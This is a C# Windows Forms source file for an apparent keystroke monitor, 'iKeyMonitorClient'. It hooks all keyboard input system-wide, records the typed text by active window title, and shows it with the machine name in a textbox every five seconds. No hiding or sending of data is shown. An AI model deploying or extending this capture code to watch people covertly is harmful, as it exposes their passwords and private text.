using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace iKeyMonitorClient
{
    public partial class Main : Form
    {
        #region Constructor

        /// <summary>
        ///     Initiate component
        /// </summary>
        public Main()
        {
            InitializeComponent();

            _dictionary = new ConcurrentDictionary<string, string>();

            _loggingTimer = new Timer();
            _loggingTimer.Interval = 5000;
            _loggingTimer.Tick += LoggingTimerOnTick;
        }

        #endregion

        #region Properties

        /// <summary>
        /// Keyboard hook.
        /// </summary>
        private IKeyboardMouseEvents _keyboardGlobalHook;

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        /// <summary>
        /// Computer name on which this software runs.
        /// </summary>
        private string _computerName;

        /// <summary>
        ///     Collection of screen and pressed key.
        /// </summary>
        private readonly IDictionary<string, string> _dictionary;

        /// <summary>
        ///     Timer which is used for logging into screen.
        /// </summary>
        private readonly Timer _loggingTimer;

        #endregion

        #region Methods

        /// <summary>
        ///     Find title of current activated window.
        /// </summary>
        /// <returns></returns>
        private string FindActiveWindowTitle()
        {
            const int nChars = 256;
            var buff = new StringBuilder(nChars);
            var handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, nChars) > 0)
                return buff.ToString();
            return null;
        }

        /// <summary>
        ///     Subscribe key & mouse hook.
        /// </summary>
        public void Subscribe()
        {
            // Note: for the application hook, use the Hook.AppEvents() instead
            _keyboardGlobalHook = Hook.GlobalEvents();
            _keyboardGlobalHook.KeyPress += KeyboardGlobalHookKeyPress;
        }

        /// <summary>
        ///     This event is fired when key is pressed down.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void KeyboardGlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            var applicationTitle = FindActiveWindowTitle();
            if (string.IsNullOrEmpty(applicationTitle))
                applicationTitle = "<unknown>";
            if (!_dictionary.ContainsKey(applicationTitle))
                _dictionary[applicationTitle] = "";
            
            if (e.KeyChar == '\b')
                _dictionary[applicationTitle] = "<BackSpace>";
            else
                _dictionary[applicationTitle] += e.KeyChar;
        }

        public void Unsubscribe()
        {
            _keyboardGlobalHook.KeyPress -= KeyboardGlobalHookKeyPress;

            //It is recommened to dispose it
            _keyboardGlobalHook.Dispose();
        }

        /// <summary>
        ///     Callback which is fired when logging timer eslapsed.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="eventArgs"></param>
        private void LoggingTimerOnTick(object sender, EventArgs eventArgs)
        {
            if (_dictionary.Count < 1)
                return;

            var text = string.Join("\n", _dictionary.Select(x => $"{x.Key} : {x.Value}"));
            _dictionary.Clear();
            txtMonitor.Text += $"{_computerName} - {DateTime.Now} - {text}\n";
        }

        /// <summary>
        ///     Callback which is fired when window has been loaded.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ClientWindowLoaded(object sender, EventArgs e)
        {
            // Get computer name.
            _computerName = Environment.MachineName;

            _loggingTimer.Start();
            Subscribe();
        }

        #endregion
    }
}